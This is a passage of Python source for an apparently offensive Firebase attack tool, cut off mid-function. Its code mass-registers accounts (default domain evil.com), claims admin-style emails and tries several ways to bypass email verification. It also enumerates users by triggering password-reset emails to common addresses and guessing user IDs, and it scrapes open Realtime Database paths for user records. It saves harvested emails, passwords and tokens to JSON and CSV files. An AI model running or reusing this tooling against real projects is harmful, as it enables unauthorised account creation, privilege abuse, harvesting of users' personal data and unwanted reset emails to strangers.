                refresh_token = user_info.get('refreshToken', '')
                
                print(f"{Colors.GREEN}[✓] User created successfully!{Colors.ENDC}")
                print(f"    Email: {email}")
                print(f"    User ID: {user_id}")
                print(f"    ID Token: {id_token[:50]}...")
                print(f"    Refresh Token: {refresh_token[:50]}...")
                
                # Save credentials to file
                creds_file = f"firebase_user_{user_id}.json"
                creds_data = {
                    "email": email,
                    "password": password,
                    "user_id": user_id,
                    "id_token": id_token,
                    "refresh_token": refresh_token,
                    "created_at": time.time(),
                    "endpoint": endpoint
                }
                
                with open(creds_file, 'w') as f:
                    json.dump(creds_data, f, indent=2)
                    
                print(f"{Colors.GREEN}[✓] Credentials saved to: {creds_file}{Colors.ENDC}")
                
            else:
                print(f"{Colors.FAIL}[!] Failed to create user: {response.status_code}{Colors.ENDC}")
                print(f"    Response: {response.text}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error creating user: {e}{Colors.ENDC}")

    def _create_bulk_users(self, endpoint: str, api_key: str) -> None:
        """Create multiple user accounts"""
        print(f"\n{Colors.CYAN}[*] Bulk User Creation{Colors.ENDC}")
        
        try:
            count = int(input(f"{Colors.BOLD}[+] How many users to create (1-50): {Colors.ENDC}"))
            if count < 1 or count > 50:
                print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                return
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid number{Colors.ENDC}")
            return
        
        domain = input(f"{Colors.BOLD}[+] Email domain (default: evil.com): {Colors.ENDC}").strip()
        if not domain:
            domain = "evil.com"
        
        password_base = input(f"{Colors.BOLD}[+] Password base (default: HackerPass): {Colors.ENDC}").strip()
        if not password_base:
            password_base = "HackerPass"
        
        created_users = []
        timestamp = int(time.time())
        
        print(f"\n{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
        
        for i in range(count):
            email = f"bulk{timestamp}_{i}@{domain}"
            password = f"{password_base}{i}123!"
            
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=5)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    created_users.append({
                        "email": email,
                        "password": password,
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', '')
                    })
                    print(f"{Colors.GREEN}[✓] Created: {email} (ID: {user_id}){Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[✗] Failed: {email} - {response.status_code}{Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.FAIL}[✗] Error creating {email}: {e}{Colors.ENDC}")
            
            # Small delay to avoid rate limiting
            time.sleep(0.5)
        
        # Save all created users
        if created_users:
            bulk_file = f"firebase_bulk_users_{timestamp}.json"
            with open(bulk_file, 'w') as f:
                json.dump(created_users, f, indent=2)
            
            print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
            print(f"[✓] Credentials saved to: {bulk_file}{Colors.ENDC}")

    def _create_admin_user(self, endpoint: str, api_key: str) -> None:
        """Attempt to create an admin-like user"""
        print(f"\n{Colors.CYAN}[*] Creating Admin-like User{Colors.ENDC}")
        
        admin_emails = [
            "admin@company.com",
            "administrator@company.com", 
            "root@company.com",
            "support@company.com",
            "admin@" + self.project_id + ".com"
        ]
        
        for email in admin_emails:
            print(f"{Colors.CYAN}[*] Trying admin email: {email}{Colors.ENDC}")
            
            user_data = {
                "email": email,
                "password": "AdminPass123!",
                "displayName": "System Administrator",
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=10)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    
                    print(f"{Colors.GREEN}[✓] Admin user created!{Colors.ENDC}")
                    print(f"    Email: {email}")
                    print(f"    User ID: {user_id}")
                    
                    # Save admin credentials
                    admin_file = f"firebase_admin_{user_id}.json"
                    admin_data = {
                        "email": email,
                        "password": "AdminPass123!",
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', ''),
                        "role": "potential_admin",
                        "created_at": time.time()
                    }
                    
                    with open(admin_file, 'w') as f:
                        json.dump(admin_data, f, indent=2)
                    
                    print(f"{Colors.GREEN}[✓] Admin credentials saved to: {admin_file}{Colors.ENDC}")
                    return
                    
                elif response.status_code == 400:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', '')
                    if 'EMAIL_EXISTS' in error_msg:
                        print(f"{Colors.WARNING}[!] Email already exists: {email}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed: {error_msg}{Colors.ENDC}")
                        
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error with {email}: {e}{Colors.ENDC}")
        
        print(f"{Colors.WARNING}[!] No admin emails were available{Colors.ENDC}")

    def _extract_user_info(self, api_key: str) -> None:
        """Extract comprehensive information about existing users"""
        print(f"\n{Colors.CYAN}[*] Advanced User Information Extraction{Colors.ENDC}")
        
        # Opciones de extracción
        print(f"\n{Colors.CYAN}[*] Extraction Methods:{Colors.ENDC}")
        print("1. Extract from saved tokens (basic)")
        print("2. Enumerate common emails")
        print("3. Extract from open database")
        print("4. Try User ID enumeration")
        print("5. Comprehensive extraction (all methods)")
        print("6. Export all users to file")
        
        choice = input(f"\n{Colors.BOLD}[+] Select extraction method (1-6): {Colors.ENDC}").strip()
        
        all_users = []
        
        if choice == "1" or choice == "5":
            users = self._extract_from_saved_tokens(api_key)
            all_users.extend(users)
            
        if choice == "2" or choice == "5":
            users = self._enumerate_common_emails(api_key)
            all_users.extend(users)
            
        if choice == "3" or choice == "5":
            users = self._extract_from_database()
            all_users.extend(users)
            
        if choice == "4" or choice == "5":
            users = self._enumerate_user_ids(api_key)
            all_users.extend(users)
            
        if choice == "6":
            self._export_all_users()
            return
        
        # Mostrar resultados
        if all_users:
            self._display_extracted_users(all_users)
            self._save_extracted_users(all_users)
        else:
            print(f"{Colors.WARNING}[!] No users found with selected methods{Colors.ENDC}")

    def _extract_from_saved_tokens(self, api_key: str) -> List[Dict]:
            """Enhanced extraction from saved token files"""
            import glob
            
            users = []
            token_files = glob.glob("firebase_*.json")
            
            if not token_files:
                print(f"{Colors.WARNING}[!] No saved token files found{Colors.ENDC}")
                return users
            
            print(f"{Colors.GREEN}[✓] Found {len(token_files)} token files{Colors.ENDC}")
            
            profile_endpoints = [
                f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}",
                f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={api_key}"
            ]
            
            for token_file in token_files:
                try:
                    with open(token_file, 'r') as f:
                        user_data = json.load(f)
                    
                    id_token = user_data.get('id_token', '')
                    if not id_token:
                        continue
                    
                    print(f"{Colors.CYAN}[*] Extracting from: {token_file}{Colors.ENDC}")
                    
                    for endpoint in profile_endpoints:
                        try:
                            profile_data = {"idToken": id_token}
                            response = self.session.post(endpoint, json=profile_data, timeout=10)
                            
                            if response.status_code == 200:
                                profile_info = response.json()
                                
                                for user in profile_info.get('users', []):
                                    user_details = {
                                        'extraction_method': 'saved_tokens',
                                        'user_id': user.get('localId', 'Unknown'),
                                        'email': user.get('email', 'Unknown'),
                                        'email_verified': user.get('emailVerified', False),
                                        'display_name': user.get('displayName', 'None'),
                                        'photo_url': user.get('photoUrl', 'None'),
                                        'phone_number': user.get('phoneNumber', 'None'),
                                        'created_at': user.get('createdAt', 'Unknown'),
                                        'last_login': user.get('lastLoginAt', 'Unknown'),
                                        'last_refresh': user.get('lastRefreshAt', 'Unknown'),
                                        'disabled': user.get('disabled', False),
                                        'custom_attributes': user.get('customAttributes', 'None'),
                                        'provider_data': user.get('providerUserInfo', []),
                                        'token_file': token_file,
                                        'password': user_data.get('password', 'Unknown'),
                                        'id_token': id_token[:20] + '...',
                                        'refresh_token': user_data.get('refresh_token', 'Unknown')[:20] + '...' if user_data.get('refresh_token') else 'None'
                                    }
                                    users.append(user_details)
                                    
                                    print(f"{Colors.GREEN}[✓] User: {user_details['email']} (Verified: {user_details['email_verified']}){Colors.ENDC}")
                                
                                break  # Success, no need to try other endpoints
                                
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    print(f"{Colors.FAIL}[!] Error processing {token_file}: {e}{Colors.ENDC}")
            
            return users

    def _display_extracted_users(self, users: List[Dict]) -> None:
        """Display extracted users in organized format"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           EXTRACTED USERS REPORT         ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not users:
            print(f"{Colors.WARNING}[!] No users extracted{Colors.ENDC}")
            return
        
        # Group by extraction method
        methods = {}
        for user in users:
            method = user.get('extraction_method', 'unknown')
            if method not in methods:
                methods[method] = []
            methods[method].append(user)
        
        print(f"\n{Colors.BOLD}SUMMARY:{Colors.ENDC}")
        print(f"Total Users Found: {len(users)}")
        
        for method, method_users in methods.items():
            print(f"  • {method}: {len(method_users)} users")
        
        # Display detailed information
        for method, method_users in methods.items():
            print(f"\n{Colors.CYAN}{'='*50}")
            print(f"{method.upper().replace('_', ' ')} ({len(method_users)} users)")
            print(f"{'='*50}{Colors.ENDC}")
            
            for i, user in enumerate(method_users, 1):
                print(f"\n{Colors.GREEN}[{i}] User Details:{Colors.ENDC}")
                
                # Display key information first
                key_fields = ['email', 'user_id', 'display_name', 'email_verified', 'password']
                for field in key_fields:
                    if field in user and user[field] not in [None, 'None', 'Unknown']:
                        color = Colors.FAIL if field == 'password' else Colors.WHITE
                        print(f"    {color}{field}: {user[field]}{Colors.ENDC}")
                
                # Display other fields
                for key, value in user.items():
                    if key not in key_fields and key != 'extraction_method' and value not in [None, 'None', 'Unknown', '']:
                        if isinstance(value, list) and len(value) > 0:
                            print(f"    {key}: {len(value)} items")
                        elif isinstance(value, dict):
                            print(f"    {key}: {len(value)} fields")
                        else:
                            print(f"    {key}: {value}")
        
        # Show credentials summary
        cred_users = [u for u in users if u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            print(f"\n{Colors.FAIL}🚨 CREDENTIALS FOUND! 🚨{Colors.ENDC}")
            print(f"{Colors.FAIL}Users with extracted passwords: {len(cred_users)}{Colors.ENDC}")
            
            for user in cred_users:
                print(f"  • {user.get('email', 'Unknown')}: {user.get('password', 'Unknown')}")

    def _export_all_users(self) -> None:
        """Export all users from all available token files"""
        import glob
        
        print(f"\n{Colors.CYAN}[*] Exporting All User Data{Colors.ENDC}")
        
        token_files = glob.glob("firebase_*.json")
        
        if not token_files:
            print(f"{Colors.WARNING}[!] No token files found to export{Colors.ENDC}")
            return
        
        all_user_data = []
        
        for token_file in token_files:
            try:
                with open(token_file, 'r') as f:
                    user_data = json.load(f)
                    
                # Add file source
                user_data['source_file'] = token_file
                all_user_data.append(user_data)
                
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error reading {token_file}: {e}{Colors.ENDC}")
        
        if all_user_data:
            timestamp = int(time.time())
            export_filename = f"firebase_all_users_export_{timestamp}.json"
            
            with open(export_filename, 'w') as f:
                json.dump(all_user_data, f, indent=2)
            
            print(f"{Colors.GREEN}[✓] Exported {len(all_user_data)} user records to: {export_filename}{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] No user data to export{Colors.ENDC}")

    def _test_email_verification_bypass(self, api_key: str) -> None:
        """Test various email verification bypass techniques"""
        print(f"\n{Colors.CYAN}[*] Email Verification Bypass Testing{Colors.ENDC}")
        
        test_email = input(f"{Colors.BOLD}[+] Enter test email (or press Enter for random): {Colors.ENDC}").strip()
        if not test_email:
            test_email = f"bypass_test_{int(time.time())}@evil.com"
        
        test_password = input(f"{Colors.BOLD}[+] Enter test password (default: BypassTest123!): {Colors.ENDC}").strip()
        if not test_password:
            test_password = "BypassTest123!"
        
        print(f"\n{Colors.CYAN}[*] Testing bypass techniques for: {test_email}{Colors.ENDC}")
        
        # Create unverified user
        user_data = self._create_test_user(test_email, test_password, api_key)
        if not user_data:
            print(f"{Colors.FAIL}[!] Could not create test user{Colors.ENDC}")
            return
        
        id_token = user_data.get('idToken')
        email_verified = user_data.get('emailVerified', False)
        user_id = user_data.get('localId')
        
        print(f"{Colors.GREEN}[✓] Test user created{Colors.ENDC}")
        print(f"    Email: {test_email}")
        print(f"    User ID: {user_id}")
        print(f"    Email Verified: {email_verified}")
        
        if email_verified:
            print(f"{Colors.WARNING}[!] Email is already verified - no bypass needed{Colors.ENDC}")
            return
        
        # Test bypass methods
        bypass_methods = [
            ("Direct Verification Toggle", self._try_direct_verification_bypass),
            ("Profile Update Bypass", self._try_profile_update_bypass),
            ("Custom Claims Bypass", self._try_custom_claims_bypass),
            ("Admin SDK Bypass", self._try_admin_sdk_bypass),
            ("Provider Linking Bypass", self._try_provider_bypass)
        ]
        
        successful_bypasses = []
        
        for method_name, method_func in bypass_methods:
            try:
                print(f"\n{Colors.CYAN}[*] Testing: {method_name}{Colors.ENDC}")
                result = method_func(id_token, test_email, api_key)
                
                if result.get('success'):
                    print(f"{Colors.GREEN}[+] SUCCESS: {method_name}{Colors.ENDC}")
                    print(f"    Details: {result.get('details', 'No details')}")
                    successful_bypasses.append(method_name)
                    
                    # Update token if method provided new one
                    if result.get('new_token'):
                        id_token = result['new_token']
                else:
                    print(f"{Colors.FAIL}[-] FAILED: {method_name}{Colors.ENDC}")
                    if result.get('error'):
                        print(f"    Error: {result['error']}")
                        
            except Exception as e:
                print(f"{Colors.FAIL}[!] ERROR in {method_name}: {e}{Colors.ENDC}")
        
        # Test access levels without verification
        print(f"\n{Colors.CYAN}[*] Testing Access Levels Without Verification{Colors.ENDC}")
        
        access_tests = [
            ("Profile Read", lambda: self._test_profile_access(id_token, 'read', api_key)),
            ("Profile Write", lambda: self._test_profile_access(id_token, 'write', api_key)),
            ("Database Access", lambda: self._test_database_access_unverified(id_token)),
            ("Password Change", lambda: self._test_password_change_unverified(id_token, api_key)),
            ("Account Deletion", lambda: self._test_account_deletion_unverified(id_token, api_key))
        ]
        
        accessible_features = []
        
        for test_name, test_func in access_tests:
            try:
                can_access = test_func()
                if can_access:
                    print(f"{Colors.GREEN}[+] ACCESSIBLE: {test_name}{Colors.ENDC}")
                    accessible_features.append(test_name)
                else:
                    print(f"{Colors.FAIL}[-] BLOCKED: {test_name}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.WARNING}[?] ERROR testing {test_name}: {e}{Colors.ENDC}")
        
        # Summary
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║        VERIFICATION BYPASS SUMMARY       ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"Test Email: {test_email}")
        print(f"Successful Bypasses: {len(successful_bypasses)}")
        for bypass in successful_bypasses:
            print(f"  • {bypass}")
        
        print(f"Accessible Features: {len(accessible_features)}")
        for feature in accessible_features:
            print(f"  • {feature}")
        
        if successful_bypasses or accessible_features:
            print(f"\n{Colors.FAIL}🚨 VERIFICATION WEAKNESSES FOUND! 🚨{Colors.ENDC}")
            
            if successful_bypasses:
                print(f"{Colors.FAIL}Email verification can be bypassed using:{Colors.ENDC}")
                for bypass in successful_bypasses:
                    print(f"  • {bypass}")
            
            if accessible_features:
                print(f"{Colors.WARNING}Features accessible without verification:{Colors.ENDC}")
                for feature in accessible_features:
                    print(f"  • {feature}")
        else:
            print(f"\n{Colors.GREEN}[✓] Email verification appears to be properly enforced{Colors.ENDC}")
        
        # Save test results
        test_results = {
            'test_email': test_email,
            'user_id': user_id,
            'original_verified_status': email_verified,
            'successful_bypasses': successful_bypasses,
            'accessible_features': accessible_features,
            'id_token': id_token,
            'timestamp': int(time.time())
        }
       
        
        result_file = f"verification_bypass_test_{int(time.time())}.json"
        with open(result_file, 'w') as f:
            json.dump(test_results, f, indent=2)
        
        print(f"\n{Colors.GREEN}[✓] Test results saved to: {result_file}{Colors.ENDC}")
        
        # Offer cleanup
        if input(f"\n{Colors.BOLD}[?] Delete test user? (Y/n): {Colors.ENDC}").lower() != 'n':
            try:
                self._delete_test_user(id_token, api_key)
                print(f"{Colors.GREEN}[✓] Test user deleted{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.WARNING}[!] Could not delete test user: {e}{Colors.ENDC}")

    def _create_test_user(self, email: str, password: str, api_key: str) -> Optional[Dict]:
        """Create a test user for bypass testing"""
        signup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
        
        signup_data = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        
        try:
            response = self.session.post(signup_endpoint, json=signup_data, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"    Error creating test user: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    Exception creating test user: {e}")
            return None

    def _try_direct_verification_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to directly toggle email verification status"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        update_data = {
            "idToken": id_token,
            "emailVerified": True
        }
        
        try:
            response = self.session.post(update_endpoint, json=update_data, timeout=10)
            
            if response.status_code == 200:
                updated_user = response.json()
                is_verified = updated_user.get('emailVerified', False)
                
                return {
                    'success': is_verified,
                    'details': f'Email verification toggled to: {is_verified}',
                    'new_token': updated_user.get('idToken')
                }
            else:
                return {
                    'success': False,
                    'error': f"HTTP {response.status_code}: {response.text[:100]}"
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def _try_profile_update_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification through profile updates"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        # Try various profile update combinations
        update_attempts = [
            {"displayName": "Verified User", "emailVerified": True},
            {"photoUrl": "https://example.com/photo.jpg", "emailVerified": True},
            {"displayName": "Admin", "customAttributes": '{"verified": true}'},
            {"email": email, "emailVerified": True}
        ]
        
        for attempt in update_attempts:
            try:
                update_data = {"idToken": id_token}
                update_data.update(attempt)
                
                response = self.session.post(update_endpoint, json=update_data, timeout=5)
                
                if response.status_code == 200:
                    updated_user = response.json()
                    if updated_user.get('emailVerified'):
                        return {
                            'success': True,
                            'details': f'Profile update bypass successful with: {attempt}',
                            'new_token': updated_user.get('idToken')
                        }
                        
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'All profile update attempts failed'
        }

    def _try_custom_claims_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to set custom claims for verification bypass"""
        claims_endpoint = f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}:setCustomUserClaims?key={api_key}"
        
        # Extract user ID from token (simplified)
        import base64
        try:
            # Decode JWT payload (not secure, just for UID extraction)
            parts = id_token.split('.')
            if len(parts) > 1:
                payload = base64.b64decode(parts[1] + '==')
                token_data = json.loads(payload)
                user_id = token_data.get('user_id', 'unknown')
            else:
                user_id = 'unknown'
        except:
            user_id = 'unknown'
        
        custom_claims_attempts = [
            {"email_verified": True},
            {"verified": True},
            {"admin": True},
            {"bypass_verification": True},
            {"role": "admin", "verified": True}
        ]
        
        for claims in custom_claims_attempts:
            try:
                claims_data = {
                    "uid": user_id,
                    "customClaims": claims
                }
                
                response = self.session.post(claims_endpoint, json=claims_data, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'details': f'Custom claims set: {claims}',
                        'claims': claims
                    }
                    
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'Could not set custom claims'
        }

    def _try_admin_sdk_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to use Admin SDK endpoints for bypass"""
        admin_endpoints = [
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:update?key={api_key}",
            f"https://firebase.googleapis.com/v1/projects/{self.project_id}/accounts:batchUpdate?key={api_key}"
        ]
        
        for endpoint in admin_endpoints:
            try:
                admin_data = {
                    "users": [{
                        "email": email,
                        "emailVerified": True
                    }]
                }
                
                response = self.session.post(endpoint, json=admin_data, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'details': f'Admin SDK bypass successful via: {endpoint}',
                        'endpoint': endpoint
                    }
                    
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'No admin endpoints accessible'
        }

    def _try_provider_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification by linking external providers"""
        link_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:linkWithOAuth?key={api_key}"
        
        # Simulate provider linking attempts
        providers = [
            {"providerId": "google.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"},
            {"providerId": "facebook.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"},
            {"providerId": "github.com", "requestUri": f"https://{self.project_id}.firebaseapp.com"}
        ]
        
        for provider in providers:
            try:
                link_data = {
                    "idToken": id_token,
                    "returnSecureToken": True
                }
                link_data.update(provider)
                
                response = self.session.post(link_endpoint, json=link_data, timeout=5)
                
                if response.status_code == 200:
                    linked_user = response.json()
                    if linked_user.get('emailVerified'):
                        return {
                            'success': True,
                            'details': f'Provider linking bypass with: {provider["providerId"]}',
                            'provider': provider["providerId"],
                            'new_token': linked_user.get('idToken')
                        }
                        
            except Exception as e:
                continue
        
        return {
            'success': False,
            'error': 'Provider linking bypass failed'
        }

    def _test_account_deletion_unverified(self, id_token: str, api_key: str) -> bool:
        """Test if account can be deleted without verification"""
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        
        # Note: This is a destructive test, should be used carefully
        # For now, just return False to avoid accidental deletion
        return False

    def _delete_test_user(self, id_token: str, api_key: str) -> bool:
        """Delete test user for cleanup"""
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        
        delete_data = {"idToken": id_token}
        
        try:
            response = self.session.post(delete_endpoint, json=delete_data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _test_password_change_unverified(self, id_token: str, api_key: str) -> bool:
        """Test password change without email verification"""
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        
        change_data = {
            "idToken": id_token,
            "password": "NewTestPassword123!"
        }
        
        try:
            response = self.session.post(update_endpoint, json=change_data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _test_database_access_unverified(self, id_token: str) -> bool:
        """Test database access without email verification"""
        if not self.project_id:
            return False
            
        db_url = f"https://{self.project_id}-default-rtdb.firebaseio.com/test_unverified.json"
        headers = {'Authorization': f'Bearer {id_token}'}
        
        try:
            # Try read
            response = self.session.get(db_url, headers=headers, timeout=5)
            if response.status_code == 200:
                return True
            
            # Try write
            test_data = {'unverified_test': True}
            response = self.session.put(db_url, json=test_data, headers=headers, timeout=5)
            if response.status_code == 200:
                # Clean up
                self.session.delete(db_url, headers=headers, timeout=3)
                return True
                
        except:
            pass
        
        return False

    def _test_profile_access(self, id_token: str, access_type: str, api_key: str) -> bool:
        """Test profile access with unverified account"""
        if access_type == 'read':
            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            data = {"idToken": id_token}
        else:  # write
            endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
            data = {"idToken": id_token, "displayName": "Unverified Test"}
        
        try:
            response = self.session.post(endpoint, json=data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def _save_extracted_users(self, users: List[Dict]) -> None:
        """Save extracted users to file with different format options"""
        if not users:
            return
            
        timestamp = int(time.time())
        
        # Save detailed JSON
        json_filename = f"firebase_users_extracted_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(users, f, indent=2)
        print(f"\n{Colors.GREEN}[✓] Detailed report saved to: {json_filename}{Colors.ENDC}")
        
        # Save credentials CSV
        cred_users = [u for u in users if u.get('email') and u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            csv_filename = f"firebase_credentials_{timestamp}.csv"
            with open(csv_filename, 'w') as f:
                f.write("email,password,user_id,verified,source\n")
                for user in cred_users:
                    f.write(f"{user.get('email', '')},{user.get('password', '')},{user.get('user_id', '')},{user.get('email_verified', False)},{user.get('extraction_method', '')}\n")
            print(f"{Colors.GREEN}[✓] Credentials saved to: {csv_filename}{Colors.ENDC}")
        
        # Save simple list
        emails = [u.get('email') for u in users if u.get('email') and '@' in u.get('email', '')]
        if emails:
            list_filename = f"firebase_emails_{timestamp}.txt"
            with open(list_filename, 'w') as f:
                for email in sorted(set(emails)):
                    f.write(f"{email}\n")
            print(f"{Colors.GREEN}[✓] Email list saved to: {list_filename}{Colors.ENDC}")

    def _enumerate_user_ids(self, api_key: str) -> List[Dict]:
        """Attempt to enumerate users by trying common User ID patterns"""
        print(f"\n{Colors.CYAN}[*] Enumerating User IDs{Colors.ENDC}")
        
        users = []
        
        # Common User ID patterns to try (Firebase UIDs are usually 28 chars, but try common patterns)
        id_patterns = [
            'user1', 'user2', 'user3', 'admin', 'test', 'demo',
            '1', '2', '3', '100', 'admin1', 'test1',
            'administrator', 'root', 'support'
        ]
        
        lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
        
        print(f"{Colors.CYAN}[*] Testing {len(id_patterns)} User ID patterns...{Colors.ENDC}")
        
        for user_id in id_patterns:
            try:
                # Try lookup by localId
                lookup_data = {"localId": [user_id]}
                
                response = self.session.post(lookup_endpoint, json=lookup_data, timeout=5)
                
                if response.status_code == 200:
                    profile_info = response.json()
                    
                    for user in profile_info.get('users', []):
                        user_details = {
                            'extraction_method': 'user_id_enumeration',
                            'user_id': user.get('localId'),
                            'email': user.get('email'),
                            'email_verified': user.get('emailVerified'),
                            'display_name': user.get('displayName'),
                            'created_at': user.get('createdAt'),
                            'last_login': user.get('lastLoginAt'),
                            'pattern_matched': user_id
                        }
                        users.append(user_details)
                        print(f"{Colors.GREEN}[+] Found user by ID: {user_id} -> {user.get('email', 'No email')}{Colors.ENDC}")
                        
            except Exception as e:
                continue
                
            time.sleep(0.2)  # Small delay
        
        return users

    def _extract_from_database(self) -> List[Dict]:
            """Extract user information from open Firebase databases"""
            print(f"\n{Colors.CYAN}[*] Extracting Users from Open Databases{Colors.ENDC}")
            
            users = []
            
            if not self.project_id:
                print(f"{Colors.WARNING}[!] Project ID needed for database extraction{Colors.ENDC}")
                return users
            
            # Database URLs to try
            db_base_urls = [
                f"https://{self.project_id}-default-rtdb.firebaseio.com",
                f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app",
                f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app",
                f"https://{self.project_id}.firebaseio.com"
            ]
            
            # Common user collection paths
            user_paths = [
                '/users.json',
                '/user.json',
                '/accounts.json',
                '/profiles.json',
                '/members.json',
                '/customers.json',
                '/admin.json'
            ]
            
            for base_url in db_base_urls:
                for path in user_paths:
                    db_url = base_url + path
                    
                    try:
                        print(f"{Colors.CYAN}[*] Checking: {db_url}{Colors.ENDC}")
                        response = self.session.get(db_url, timeout=10)
                        
                        if response.status_code == 200:
                            try:
                                data = response.json()
                                
                                if data and isinstance(data, dict):
                                    user_count = 0
                                    
                                    for key, value in data.items():
                                        if isinstance(value, dict):
                                            user_info = {
                                                'extraction_method': 'database_extraction',
                                                'database_url': db_url,
                                                'database_key': key,
                                                'raw_data': value
                                            }
                                            
                                            # Extract common fields
                                            field_mappings = {
                                                'email': ['email', 'Email', 'mail', 'emailAddress'],
                                                'name': ['name', 'Name', 'displayName', 'fullName', 'username'],
                                                'user_id': ['uid', 'id', 'userId', 'user_id', 'localId'],
                                                'phone': ['phone', 'phoneNumber', 'mobile'],
                                                'role': ['role', 'Role', 'userRole', 'permissions']
                                            }
                                            
                                            for field, possible_keys in field_mappings.items():
                                                for key_name in possible_keys:
                                                    if key_name in value:
                                                        user_info[field] = value[key_name]
                                                        break
                                            
                                            users.append(user_info)
                                            user_count += 1
                                    
                                    if user_count > 0:
                                        print(f"{Colors.GREEN}[+] Extracted {user_count} users from {db_url}{Colors.ENDC}")
                                        break  # Found users, no need to check other URLs
                                        
                            except json.JSONDecodeError:
                                continue
                                
                    except Exception as e:
                        continue
            
            return users

    def _enumerate_common_emails(self, api_key: str) -> List[Dict]:
            """Enumerate common email patterns to find existing users"""
            print(f"\n{Colors.CYAN}[*] Enumerating Common Email Patterns{Colors.ENDC}")
            
            users = []
            
            # Email patterns to test
            domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com', f'{self.project_id}.com']
            usernames = ['admin', 'administrator', 'test', 'user', 'support', 'info', 'contact', 'root', 'demo']
            
            common_emails = []
            
            # Generate combinations
            for domain in domains:
                for username in usernames:
                    common_emails.append(f"{username}@{domain}")
            
            # Add project-specific emails
            if self.project_id:
                project_emails = [
                    f"admin@{self.project_id}.com",
                    f"support@{self.project_id}.com",
                    f"test@{self.project_id}.com"
                ]
                common_emails.extend(project_emails)
            
            print(f"{Colors.CYAN}[*] Testing {len(common_emails)} email patterns...{Colors.ENDC}")
            
            # Use password reset to check if email exists
            reset_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={api_key}"
            
            for email in common_emails:
                try:
                    reset_data = {
                        "requestType": "PASSWORD_RESET",
                        "email": email
                    }
                    
                    response = self.session.post(reset_endpoint, json=reset_data, timeout=5)
                    
                    if response.status_code == 200:
                        # Email exists and reset sent
                        users.append({
                            'extraction_method': 'email_enumeration',
                            'email': email,
                            'exists': True,
                            'status': 'reset_sent',
                            'verification_method': 'password_reset'
                        })
                        print(f"{Colors.GREEN}[+] Found: {email} (reset sent){Colors.ENDC}")
                        
                    elif response.status_code == 400:
                        error_data = response.json()
                        error_msg = error_data.get('error', {}).get('message', '')
                        
